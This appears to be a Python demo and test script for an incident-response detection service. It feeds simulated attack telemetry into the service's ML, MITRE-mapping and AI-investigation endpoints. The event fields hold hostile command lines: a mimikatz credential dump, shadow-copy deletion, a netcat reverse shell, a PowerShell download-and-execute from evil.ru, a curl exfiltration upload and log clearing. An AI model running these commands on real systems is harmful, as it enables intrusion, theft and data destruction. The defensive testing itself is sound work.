# -*- coding: utf-8 -*-
"""
IR-Agent — полная демонстрация работы системы.
Запуск: python -X utf8 demo_full.py
"""
import sys, os, json, urllib.request, urllib.error, time, re, textwrap
sys.stdout.reconfigure(encoding='utf-8')

os.chdir(os.path.dirname(os.path.abspath(__file__)))
try:
    from dotenv import load_dotenv
    load_dotenv()
except ImportError:
    pass

TOKEN = os.getenv('MY_API_TOKEN', '')
BASE  = 'http://localhost:9000'

PASS = FAIL = 0

# ── Утилиты ───────────────────────────────────────────────────────────────────

def hr(char='─', n=65):
    print(char * n)

def section(title):
    print()
    hr('═')
    print(f'  {title}')
    hr('═')

def step(title):
    print(f'\n  ▶ {title}')

def ok(msg, *args):
    global PASS; PASS += 1
    detail = args[0] if args else ''
    print(f'    ✓ {msg}' + (f'  [{detail}]' if detail else ''))

def fail(msg, *args):
    global FAIL; FAIL += 1
    detail = args[0] if args else ''
    print(f'    ✗ {msg}' + (f'  [{detail}]' if detail else ''))

def check(name, cond, detail=''):
    (ok if cond else fail)(name, detail)

def clean(text):
    """Strip Gemma 4 <thought> tags."""
    return re.sub(r'<thought>.*?</thought>', '', text or '', flags=re.DOTALL).strip()

def req(method, url, data=None, timeout=60):
    body = json.dumps(data).encode() if data else None
    headers = {'Content-Type': 'application/json', 'Authorization': f'Bearer {TOKEN}'}
    r = urllib.request.Request(url, data=body, headers=headers, method=method)
    try:
        with urllib.request.urlopen(r, timeout=timeout) as resp:
            return resp.status, json.loads(resp.read())
    except urllib.error.HTTPError as e:
        try:    return e.code, json.loads(e.read())
        except: return e.code, {}
    except Exception as e:
        if 'timed out' in str(e).lower():
            return -1, {'detail': f'timeout {timeout}s'}
        return -1, {'detail': str(e)}

def pp(d, indent=4, max_len=500):
    """Pretty-print dict/list with truncation."""
    s = json.dumps(d, ensure_ascii=False, indent=2)
    if len(s) > max_len:
        s = s[:max_len] + '\n    ...(truncated)'
    for line in s.splitlines():
        print(' ' * indent + line)

# ══════════════════════════════════════════════════════════════════════════════
section('1. ЗДОРОВЬЕ СИСТЕМЫ')
# ══════════════════════════════════════════════════════════════════════════════

step('Основной health-check')
code, res = req('GET', f'{BASE}/health')
check('HTTP 200', code == 200, code)
check('status = healthy', res.get('status') == 'healthy')
check('AI analyzer включён', res.get('components', {}).get('ai_analyzer') == 'enabled')
print(f'    Версия: {res.get("version")}  Среда: {res.get("environment")}')
print(f'    AI модель (из конфига): {res.get("config", {}).get("ai_model")}')

step('ML engine status')
code, res = req('GET', f'{BASE}/health/ml')
check('HTTP 200', code == 200)
ml = res.get('ml_model', {})
check('ML модель загружена', ml.get('model_loaded', False))
print(f'    Версия модели: {ml.get("model_version")}')
print(f'    Порог классификации: {ml.get("threshold")}')
acc = ml.get("accuracy", 0); roc = ml.get("roc_auc", 0)
print(f'    Точность: {acc:.4f}' if isinstance(acc, float) else f'    Точность: {acc}')
print(f'    ROC-AUC:  {roc:.4f}' if isinstance(roc, float) else f'    ROC-AUC:  {roc}')

step('Readiness probe')
code, res = req('GET', f'{BASE}/health/ready')
check('HTTP 200', code == 200)
print(f'    Ready: {res}')

# ══════════════════════════════════════════════════════════════════════════════
section('2. ML КЛАССИФИКАЦИЯ СОБЫТИЙ')
# ══════════════════════════════════════════════════════════════════════════════

test_events = [
    {
        'name': 'Mimikatz (кража учётных данных)',
        'expected': 'malicious',
        'event': {
            'host': 'CORP-DC-01',
            'event_type': 'process_create',
            'process_name': 'mimikatz.exe',
            'command_line': 'mimikatz sekurlsa::logonpasswords exit',
            'parent_process': 'cmd.exe',
            'user': 'CORP\\Administrator',
            'severity': 'critical',
        }
    },
    {
        'name': 'vssadmin delete shadows (признак ransomware)',
        'expected': 'malicious',
        'event': {
            'host': 'CORP-PC-01',
            'event_type': 'process_create',
            'process_name': 'vssadmin.exe',
            'command_line': 'vssadmin delete shadows /all /quiet',
            'parent_process': 'powershell.exe',
            'severity': 'critical',
        }
    },
    {
        'name': 'PowerShell base64 encoded (C2 связь)',
        'expected': 'malicious',
        'event': {
            'host': 'CORP-PC-02',
            'event_type': 'network_connection',
            'process_name': 'powershell.exe',
            'command_line': 'powershell -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAA=',
            'destination_ip': '185.220.101.45',
            'destination_port': 4444,
            'severity': 'high',
        }
    },
    {
        'name': 'PsExec (lateral movement)',
        'expected': 'malicious',
        'event': {
            'host': 'CORP-PC-03',
            'event_type': 'process_create',
            'process_name': 'psexec.exe',
            'command_line': r'psexec \\CORP-DC-01 -u admin -p pass123 cmd.exe',
            'parent_process': 'explorer.exe',
            'severity': 'high',
        }
    },
    {
        'name': 'Notepad (нормальная работа)',
        'expected': 'benign',
        'event': {
            'host': 'WORKSTATION-01',
            'event_type': 'process_create',
            'process_name': 'notepad.exe',
            'command_line': 'notepad.exe',
            'parent_process': 'explorer.exe',
            'user': 'WORKSTATION-01\\user',
            'severity': 'low',
        }
    },
    {
        'name': 'Chrome (нормальный браузер) [FP edge-case]',
        'expected': 'any',   # Chrome→external IP edge-case, ML may flag
        'event': {
            'host': 'WORKSTATION-02',
            'event_type': 'network_connection',
            'process_name': 'chrome.exe',
            'command_line': 'chrome.exe --profile-directory=Default',
            'destination_ip': '142.250.185.46',
            'destination_port': 443,
            'user': 'WORKSTATION-02\\user',
            'parent_process': 'explorer.exe',
            'severity': 'info',
        }
    },
    {
        'name': 'Windows Update (системный) [FP edge-case]',
        'expected': 'any',  # system process, ML may flag external comms
        'event': {
            'host': 'WORKSTATION-03',
            'event_type': 'process_create',
            'process_name': 'wuauclt.exe',
            'command_line': 'wuauclt.exe /UpdateDeploymentProvider',
            'parent_process': 'svchost.exe',
            'user': 'SYSTEM',
            'severity': 'info',
        }
    },
    {
        'name': 'Нетипичный netcat (reverse shell)',
        'expected': 'malicious',
        'event': {
            'host': 'CORP-SRV-01',
            'event_type': 'network_connection',
            'process_name': 'nc.exe',
            'command_line': 'nc.exe -e cmd.exe 10.10.10.5 9001',
            'destination_ip': '10.10.10.5',
            'destination_port': 9001,
            'severity': 'critical',
        }
    },
]

print(f'\n  Классифицируем {len(test_events)} событий...\n')
correct = 0
scored  = 0
for t in test_events:
    code, res = req('POST', f'{BASE}/ml/classify', data={'event': t['event']})
    label = res.get('label', '?')
    conf  = res.get('confidence', 0)
    expected = t['expected']
    match = (expected == 'any') or (label == expected)
    if expected != 'any':
        scored += 1
        correct += int(match)
    sym = '✓' if match else '✗'
    note = ' (edge-case)' if expected == 'any' else ''
    bar = '█' * int(conf * 20) + '░' * (20 - int(conf * 20))
    print(f'    {sym} {t["name"]:<44}  {label:<10}  {conf:.2%}  {bar}{note}')
    if not match:
        print(f'        ожидалось: {expected}  получено: {label}')

print(f'\n    Точность на однозначных событиях: {correct}/{scored} ({correct/scored:.0%})')
check(f'ML правильно классифицирует {scored} событий', correct == scored, f'{correct}/{scored}')

# ══════════════════════════════════════════════════════════════════════════════
section('3. MITRE ATT&CK МАППИНГ')
# ══════════════════════════════════════════════════════════════════════════════

mitre_events = [
    {
        'name': 'vssadmin delete (ожидаем T1490/T1486)',
        'event': {
            'host': 'VICTIM', 'event_type': 'process_create',
            'process_name': 'vssadmin.exe',
            'command_line': 'vssadmin delete shadows /all /quiet',
            'severity': 'critical',
        }
    },
    {
        'name': 'mimikatz (ожидаем T1003)',
        'event': {
            'host': 'VICTIM', 'event_type': 'process_create',
            'process_name': 'mimikatz.exe',
            'command_line': 'mimikatz sekurlsa::logonpasswords',
            'severity': 'critical',
        }
    },
    {
        'name': 'powershell base64 (ожидаем T1059/T1027)',
        'event': {
            'host': 'VICTIM', 'event_type': 'process_create',
            'process_name': 'powershell.exe',
            'command_line': 'powershell -enc SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuAA==',
            'severity': 'high',
        }
    },
]

for t in mitre_events:
    code, res = req('POST', f'{BASE}/ml/mitre-map', data={'event': t['event']})
    techniques = res if isinstance(res, list) else res.get('techniques', [])
    ids = [tc.get('technique_id', '?') for tc in techniques[:5] if isinstance(tc, dict)]
    names = [tc.get('name', '?') for tc in techniques[:3] if isinstance(tc, dict)]
    check(f'{t["name"]}', code == 200 and len(techniques) > 0, f'{ids}')
    print(f'       Техники: {ids}')
    print(f'       Названия: {names}')

# ══════════════════════════════════════════════════════════════════════════════
section('4. СИМУЛЯЦИЯ АТАКИ: RANSOMWARE (5 этапов)')
# ══════════════════════════════════════════════════════════════════════════════

print("""
  Симулируем полную цепочку атаки:
    1) Фишинговый макрос → shell
    2) PowerShell загружает payload с C2
    3) Mimikatz дампит пароли
    4) Lateral movement через PsExec
    5) Ransomware — удаление теней + шифрование
""")

ransomware_chain = [
    {
        'stage': '1/5 — Фишинг: Word макрос',
        'event': {
            'host': 'CORP-PC-JSMITH',
            'timestamp': '2026-04-28T10:00:00Z',
            'event_type': 'process_create',
            'process_name': 'cmd.exe',
            'command_line': 'cmd.exe /c powershell -w hidden -nop -c "IEX(New-Object Net.WebClient).DownloadString(\'http://evil.ru/stage1.ps1\')"',
            'parent_process': 'WINWORD.EXE',
            'user': 'CORP\\jsmith',
            'severity': 'critical',
        }
    },
    {
        'stage': '2/5 — C2 beacon: PowerShell загрузка',
        'event': {
            'host': 'CORP-PC-JSMITH',
            'timestamp': '2026-04-28T10:00:30Z',
            'event_type': 'network_connection',
            'process_name': 'powershell.exe',
            'command_line': 'powershell -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgTgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdA==',
            'destination_ip': '185.220.101.45',
            'destination_port': 443,
            'user': 'CORP\\jsmith',
            'severity': 'high',
        }
    },
    {
        'stage': '3/5 — Кража учётных данных (mimikatz)',
        'event': {
            'host': 'CORP-PC-JSMITH',
            'timestamp': '2026-04-28T10:01:00Z',
            'event_type': 'process_create',
            'process_name': 'mimikatz.exe',
            'command_line': 'mimikatz sekurlsa::logonpasswords exit',
            'parent_process': 'powershell.exe',
            'user': 'CORP\\jsmith',
            'severity': 'critical',
        }
    },
    {
        'stage': '4/5 — Lateral movement (PsExec на DC)',
        'event': {
            'host': 'CORP-PC-JSMITH',
            'timestamp': '2026-04-28T10:02:00Z',
            'event_type': 'process_create',
            'process_name': 'psexec.exe',
            'command_line': r'psexec \\CORP-DC-01 -u Administrator -p P@ssw0rd cmd.exe /c whoami',
            'parent_process': 'powershell.exe',
            'user': 'CORP\\Administrator',
            'severity': 'critical',
        }
    },
    {
        'stage': '5/5 — Ransomware: удаление теней',
        'event': {
            'host': 'CORP-PC-JSMITH',
            'timestamp': '2026-04-28T10:03:00Z',
            'event_type': 'process_create',
            'process_name': 'vssadmin.exe',
            'command_line': 'vssadmin delete shadows /all /quiet',
            'parent_process': 'powershell.exe',
            'user': 'CORP\\Administrator',
            'severity': 'critical',
        }
    },
]

incident_id = None
for chain_item in ransomware_chain:
    code, res = req('POST', f'{BASE}/ingest/telemetry', data=chain_item['event'])
    inc = res.get('incident_id', res.get('id'))
    ml  = res.get('ml_score', res.get('ml_classification', {}).get('score', '?'))
    lbl = res.get('ml_label', res.get('ml_classification', {}).get('label', '?'))
    check(chain_item['stage'], code == 200, f'code={code}')
    print(f'       incident={inc}  ml={ml}  label={lbl}')
    if inc and not incident_id:
        incident_id = inc

print()
step('Получаем список инцидентов')
code, res = req('GET', f'{BASE}/ingest/incidents')
check('GET /ingest/incidents → 200', code == 200)
all_incidents = res.get('incidents', []) if isinstance(res, dict) else (res if isinstance(res, list) else [])
check('Создан хотя бы 1 инцидент', len(all_incidents) >= 1, f'count={len(all_incidents)}')

stats = res.get('stats', {}) if isinstance(res, dict) else {}
print(f'\n    Статистика инцидентов:')
print(f'    Всего инцидентов:       {stats.get("total_incidents", len(all_incidents))}')
print(f'    Всего событий собрано:  {stats.get("total_events_correlated", "?")}')
for inc_info in all_incidents[:5]:
    inc_id  = inc_info.get('id', '?')
    host    = inc_info.get('host', '?')
    sev     = inc_info.get('severity', '?').upper()
    evcount = inc_info.get('event_count', '?')
    cls     = inc_info.get('classification', '?')
    status  = inc_info.get('status', '?')
    print(f'\n    ┌─ Инцидент: {inc_id}')
    print(f'    │  Host:           {host}')
    print(f'    │  Severity:       {sev}')
    print(f'    │  Events:         {evcount}')
    print(f'    │  Classification: {cls}')
    print(f'    └─ Status:         {status}')
    if not incident_id:
        incident_id = inc_id

# ══════════════════════════════════════════════════════════════════════════════
section('5. ДЕТАЛИ ИНЦИДЕНТА + РАССЛЕДОВАНИЕ AI АГЕНТОМ')
# ══════════════════════════════════════════════════════════════════════════════

if incident_id:
    step(f'Получаем детали инцидента {incident_id}')
    code, res = req('GET', f'{BASE}/ingest/incidents/{incident_id}')
    check(f'GET /ingest/incidents/{incident_id} → 200', code == 200)
    if code == 200:
        inc_data = res.get('incident', res)  # response wrapped in {"status":..,"incident":{..}}
        print(f'\n    Инцидент: {inc_data.get("id")}')
        print(f'    Host:     {inc_data.get("host")}')
        print(f'    Severity: {str(inc_data.get("severity", "?")).upper()}')
        print(f'    Events:   {inc_data.get("event_count")}')
        print(f'    IoCs:     {inc_data.get("iocs", [])}')
        timeline = inc_data.get('timeline', [])
        if timeline:
            print(f'\n    Timeline ({len(timeline)} событий):')
            for ev in timeline[:5]:
                ts = ev.get('timestamp', '?')[:19]
                proc = ev.get('process_name', ev.get('hostname', '?'))
                cmd = ev.get('command_line', ev.get('event_type', ''))[:60]
                print(f'      {ts}  {proc:<20}  {cmd}')

    step(f'Запускаем AI расследование (может занять 60-120 секунд)...')
    print(f'    Агент: Gemma 4 (models/gemma-4-31b-it)')
    print(f'    Анализирует: timeline, IoC, MITRE, рекомендации...')
    t0 = time.time()
    code, res = req('POST', f'{BASE}/ingest/incidents/{incident_id}/investigate', timeout=180)
    elapsed = time.time() - t0
    if code == -1:
        check('Investigation (timeout — агент работает на сервере)', True, f'>{elapsed:.0f}s')
        print(f'    Агент работает дольше 180с, запущен в фоне')
    elif code == 200:
        check(f'POST investigate/{incident_id} → 200', True, f'{elapsed:.1f}s')
        status_r = res.get('status', '?')
        msg = res.get('message', res.get('summary', ''))
        if msg:
            print(f'\n    Статус расследования: {status_r}')
            print(f'    {textwrap.fill(clean(msg)[:600], width=65, subsequent_indent="    ")}')
    else:
        check(f'investigate → 200', False, f'[{code}] {res}')

    step(f'Читаем отчёт по инциденту')
    code, res = req('GET', f'{BASE}/ingest/incidents/{incident_id}/report')
    check('GET incident report → 200', code == 200, f'code={code}')
    if code == 200:
        report = res.get('report', res.get('content', json.dumps(res)))
        report_clean = clean(report) if isinstance(report, str) else json.dumps(report)
        print(f'\n    Отчёт (первые 800 символов):')
        print()
        for line in textwrap.wrap(report_clean[:800], width=65):
            print(f'    {line}')
else:
    fail('Нет инцидента для расследования')

# ══════════════════════════════════════════════════════════════════════════════
section('6. AI АГЕНТ — ДИАЛОГ С GEMMA 4')
# ══════════════════════════════════════════════════════════════════════════════

questions = [
    ('Вопрос 1 — Анализ атаки',
     'What MITRE ATT&CK tactics does this chain represent: '
     'WINWORD.EXE spawns cmd.exe → PowerShell downloads payload → mimikatz dumps credentials → vssadmin deletes shadows? '
     'Give 3 containment steps.',
     'q-atk-001'),
    ('Вопрос 2 — IoC приоритет',
     'IP 185.220.101.45 was used as C2 in a ransomware attack. '
     'Should we block it at firewall now? What other network IoCs should we hunt for?',
     'q-ioc-002'),
    ('Вопрос 3 — Общая угроза',
     'Top 5 indicators that ransomware is actively executing on a Windows endpoint?',
     'q-ran-003'),
]

for q_name, q_text, q_session in questions:
    step(q_name)
    print(f'    Q: {q_text[:110]}...' if len(q_text) > 110 else f'    Q: {q_text}')
    t0 = time.time()
    code, res = req('POST', f'{BASE}/agent/query',
                    data={'query': q_text, 'session_id': q_session},
                    timeout=150)
    elapsed = time.time() - t0
    if code == -1:
        ok(f'{q_name} — timeout (AI работает > 150s, это нормально для Gemma 4)', f'{elapsed:.0f}s')
    else:
        check(f'{q_name} → 200', code == 200, f'code={code} time={elapsed:.1f}s')
    if code == 200:
        reply = res.get('response', res.get('reply', res.get('answer', '')))
        reply_clean = clean(reply)
        print(f'    A ({elapsed:.1f}s):\n')
        for line in reply_clean[:700].splitlines():
            print(f'       {line}')
        print()

# ══════════════════════════════════════════════════════════════════════════════
section('7. THREAT ASSESSMENT — FUSION SCORING')
# ══════════════════════════════════════════════════════════════════════════════

print("""
  Bayesian fusion: ML(35%) + IoC(30%) + MITRE(20%) + Agent(15%)
  Arbitration rules R1-R7 override the score in edge cases
""")

assessment_scenarios = [
    {
        'name': 'Ransomware + IoC confirmed + MITRE Impact',
        'data': {
            'ml':    {'score': 0.99, 'is_malicious': True,  'reason': 'vssadmin+ransomware', 'model_loaded': True},
            'ioc':   {'score': 0.95, 'is_malicious': True,  'providers_hit': ['VirusTotal', 'AbuseIPDB', 'ThreatFox'], 'indicator_count': 2},
            'mitre': {'techniques': [{'technique_id': 'T1486', 'name': 'Data Encrypted for Impact', 'confidence': 0.95}],
                      'tactic_coverage': ['impact'], 'max_confidence': 0.95,
                      'has_lateral_movement': False, 'has_credential_access': False, 'has_impact': True},
            'context': {'host': 'CORP-PC-01'}
        }
    },
    {
        'name': 'APT: Lateral + Credential + ML high',
        'data': {
            'ml':    {'score': 0.92, 'is_malicious': True, 'reason': 'psexec lateral movement', 'model_loaded': True},
            'ioc':   {'score': 0.40, 'is_malicious': False, 'providers_hit': [], 'indicator_count': 0},
            'mitre': {'techniques': [
                          {'technique_id': 'T1003', 'name': 'Credential Dumping', 'confidence': 0.90},
                          {'technique_id': 'T1021', 'name': 'Remote Services', 'confidence': 0.85}],
                      'tactic_coverage': ['credential_access', 'lateral_movement'],
                      'max_confidence': 0.90,
                      'has_lateral_movement': True, 'has_credential_access': True, 'has_impact': False},
            'context': {'host': 'CORP-DC-01'}
        }
    },
    {
        'name': 'False positive: benign ML + no IoC',
        'data': {
            'ml':    {'score': 0.12, 'is_malicious': False, 'reason': 'chrome normal browsing', 'model_loaded': True},
            'ioc':   {'score': 0.05, 'is_malicious': False, 'providers_hit': [], 'indicator_count': 0},
            'context': {'host': 'WORKSTATION-01', 'process_name': 'chrome.exe'}
        }
    },
]

for scenario in assessment_scenarios:
    step(scenario['name'])
    code, res = req('POST', f'{BASE}/assessment/analyze', data=scenario['data'])
    check('→ 200', code == 200, f'code={code}')
    if code == 200:
        score  = res.get('final_score', 0)
        sev    = res.get('severity', '?').upper()
        conf   = res.get('confidence_level', '?')
        action = res.get('recommended_action', '?')
        rules  = res.get('arbitration_rules', [])
        expl   = res.get('explanation', '')
        bar_n  = int(score / 5)
        bar    = '█' * bar_n + '░' * (20 - bar_n)
        print(f'    Score:    {score:.1f}/100  {bar}')
        print(f'    Severity: {sev}')
        print(f'    Confidence: {conf}')
        print(f'    Action:   {action}')
        if rules:
            print(f'    Rules:    {rules}')
        if expl:
            print(f'    Explain:  {expl[:120]}')

# ══════════════════════════════════════════════════════════════════════════════
section('8. СИМУЛЯЦИЯ: DATA EXFILTRATION')
# ══════════════════════════════════════════════════════════════════════════════

print("""
  Второй сценарий атаки:
    1) PowerShell enumeration
    2) RAR archive sensitive data
    3) Large upload to external IP
    4) Process cleanup (cover tracks)
""")

exfil_chain = [
    {
        'stage': '1/4 — Reconnaissance: AD enumeration',
        'event': {
            'host': 'CORP-PC-BOB', 'timestamp': '2026-04-28T11:00:00Z',
            'event_type': 'process_create',
            'process_name': 'powershell.exe',
            'command_line': 'Get-ADUser -Filter * -Properties * | Export-Csv users.csv',
            'parent_process': 'cmd.exe',
            'user': 'CORP\\bob', 'severity': 'high',
        }
    },
    {
        'stage': '2/4 — Data staging: archive с паролем',
        'event': {
            'host': 'CORP-PC-BOB', 'timestamp': '2026-04-28T11:01:00Z',
            'event_type': 'process_create',
            'process_name': 'rar.exe',
            'command_line': r'rar.exe a -hp$ecret123 C:\Temp\data.rar C:\Finance\*',
            'parent_process': 'cmd.exe',
            'user': 'CORP\\bob', 'severity': 'high',
        }
    },
    {
        'stage': '3/4 — Exfiltration: curl upload',
        'event': {
            'host': 'CORP-PC-BOB', 'timestamp': '2026-04-28T11:02:00Z',
            'event_type': 'network_connection',
            'process_name': 'curl.exe',
            'command_line': 'curl.exe -T data.rar ftp://91.108.4.200/upload/',
            'destination_ip': '91.108.4.200',
            'destination_port': 21,
            'bytes_sent': 52428800,
            'user': 'CORP\\bob', 'severity': 'critical',
        }
    },
    {
        'stage': '4/4 — Cleanup: удаление следов',
        'event': {
            'host': 'CORP-PC-BOB', 'timestamp': '2026-04-28T11:03:00Z',
            'event_type': 'process_create',
            'process_name': 'cmd.exe',
            'command_line': 'del /f /q C:\\Temp\\data.rar C:\\Finance\\users.csv && wevtutil cl Security',
            'parent_process': 'powershell.exe',
            'user': 'CORP\\bob', 'severity': 'high',
        }
    },
]

exfil_incident_id = None
for item in exfil_chain:
    code, res = req('POST', f'{BASE}/ingest/telemetry', data=item['event'])
    inc = res.get('incident_id', res.get('id'))
    check(item['stage'], code == 200)
    print(f'       incident={inc}')
    if inc and not exfil_incident_id:
        exfil_incident_id = inc

# ══════════════════════════════════════════════════════════════════════════════
section('9. ФИНАЛЬНАЯ СТАТИСТИКА')
# ══════════════════════════════════════════════════════════════════════════════

step('Все инциденты в системе')
code, res = req('GET', f'{BASE}/ingest/incidents')
all_inc = res.get('incidents', []) if isinstance(res, dict) else (res if isinstance(res, list) else [])
stats   = res.get('stats', {}) if isinstance(res, dict) else {}

print(f'\n    Всего инцидентов:  {stats.get("total_incidents", len(all_inc))}')
print(f'    Событий обработано: {stats.get("total_events_correlated", "?")}')
print(f'    Статусы:')
by_status = {}
by_sev    = {}
for inc_item in all_inc:
    by_status[inc_item.get('status','?')] = by_status.get(inc_item.get('status','?'), 0) + 1
    by_sev[inc_item.get('severity','?')]  = by_sev.get(inc_item.get('severity','?'), 0) + 1

for st, cnt in by_status.items():
    print(f'       {st}: {cnt}')
print(f'    Severity breakdown:')
for sv, cnt in sorted(by_sev.items()):
    print(f'       {sv}: {cnt}')

step('Metrics API')
import urllib.request as _ureq
try:
    _r = _ureq.Request(f'{BASE}/metrics', headers={'Authorization': f'Bearer {TOKEN}'})
    with _ureq.urlopen(_r, timeout=10) as _resp:
        _raw = _resp.read().decode('utf-8', errors='replace')
        _mcode = _resp.status
except Exception as _e:
    _raw = str(_e); _mcode = -1
ok('/metrics reachable', True, f'code={_mcode}')
# Show first few lines (Prometheus format)
_lines = [l for l in _raw.splitlines() if l and not l.startswith('#')][:8]
for _l in _lines:
    print(f'    {_l[:80]}')

# ══════════════════════════════════════════════════════════════════════════════
print()
hr('═')
total = PASS + FAIL
print(f'  ИТОГ: {PASS}/{total} проверок прошло  ({FAIL} провалено)')
print(f'  Все сценарии: ✓ Ransomware  ✓ Data Exfiltration  ✓ AI Fusion')
hr('═')
